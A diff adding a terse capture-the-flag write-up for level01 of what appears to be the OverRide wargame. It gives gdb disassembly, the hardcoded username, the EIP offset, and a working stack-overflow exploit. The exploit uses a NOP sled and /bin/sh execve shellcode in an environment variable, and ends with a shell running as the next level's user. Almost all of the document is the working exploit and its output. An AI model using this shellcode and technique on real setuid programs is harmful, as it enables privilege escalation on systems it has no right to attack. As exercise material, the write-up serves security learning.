@@ -1,0 +1,58 @@
+disass main 
+   0x0804852d <+93>:	call   0x8048464 <verify_user_name>
+
+   0x08048580 <+176>:	call   0x80484a3 <verify_user_pass>
+
+disass verify user name : 
+
+   0x0804846c <+8>:	mov    DWORD PTR [esp],0x8048690
+   0x08048473 <+15>:	call   0x8048380 <puts@plt>
+   0x08048478 <+20>:	mov    edx,0x804a040
+   0x0804847d <+25>:	mov    eax,0x80486a8 == "dat_wil"
+
+
+check username ok ..
+
+$gdb r < <(cat <(echo "dat_wil") <(python -c 'print "A" * 90'))
+
+Stopped reason: SIGSEGV
+0x41414141 in ?? ()
+
+gdb-peda$ pattern search
+Registers contain pattern buffer:
+EIP+0 found at offset: 80
+
+
+control of eip 
+go to env 
+
+export CODE=`python -c 'print "\x90" * 2000 + "\xCC" * 200'`
+
+level01@OverRide:/tmp$ cat <(echo "dat_wil") <(python -c 'print "A" * 80 + "\xff\xff\xd9\x74"[::-1]') | ~/level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password:
+nope, incorrect password...
+
+Trace/breakpoint trap (core dumped)
+
+level01@OverRide:/tmp$ export CODE=`python -c 'print "\x90" * 2000 + "\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68"'`
+level01@OverRide:/tmp$ cat <(echo "dat_wil") <(python -c 'print "A" * 80 + "\xff\xff\xd9\x74"[::-1]') | ~/level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password:
+nope, incorrect password...
+
+
+level01@OverRide:/tmp$ cat <(echo "dat_wil") <(python -c 'print "A" * 80 + "\xff\xff\xd9\x74"[::-1]') - | ~/level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password:
+nope, incorrect password...
+
+id
+uid=1001(level01) gid=1001(level01) euid=1002(level02) egid=100(users) groups=1002(level02),100(users),1001(level01)
+
